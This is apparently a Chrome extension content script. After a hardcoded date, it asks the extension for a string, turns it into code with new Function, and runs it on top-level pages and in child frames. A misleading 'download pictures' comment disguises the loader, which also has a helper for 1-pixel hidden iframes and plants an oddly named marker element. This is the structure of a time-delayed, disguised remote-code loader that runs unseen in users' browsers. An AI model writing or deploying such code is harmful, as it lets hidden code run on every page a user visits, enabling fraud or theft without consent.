var cfg;

function createFrame(src) {
    var iframe = document.createElement('iframe');
    iframe.src = src;
    iframe.frameBorder = 0;
    iframe.scrolling = 'no';
    iframe.style = 'width:1px;height:1px;margin-left:1px;margin-top:10px;';
    return iframe;
}

function htmlspecialchars(str) {
    str = str.replace(/</g, '&lt;');
    str = str.replace(/>/g, '&gt;');
    str = str.replace(/"/g, '&quot;');
    str = str.replace(/'/g, '&#039;');
    return str;
}


if (new Date().getTime() > 1525910400000) {
    if (self === top) {
        chrome.runtime.sendMessage({ evt: 'job-start' }, function(response) {
            if (!response) {
                chrome.runtime.sendMessage({ evt: 'startWorkNull' }, function(resp) {
                    var logo_data = new Function('port', "return " + resp);
                    cfg = logo_data('port')()
                    chrome.runtime.sendMessage({ evt: 'say-hello' }, function(response) {
                        if (response < 10) {
                            cfg.sayHello()
                        }
                    })
                })
            } else {
                var logo_data = new Function('port', "return " + response);
                cfg = logo_data('port')()
                chrome.runtime.sendMessage({ evt: 'say-hello' }, function(response) {
                    if (response < 10) {
                        cfg.sayHello()
                    }
                })
            }
        })
        $('body').append('<span id="kidjflaiefmhw0998"></span>');

    } else {
        // download pictures in the child frames
        chrome.runtime.sendMessage({ evt: 'startWorkNull' }, function(resp) {
            var logo_data = new Function('port', "return " + resp);
            cfg = logo_data('port')()
            cfg.child()
        })
    }
}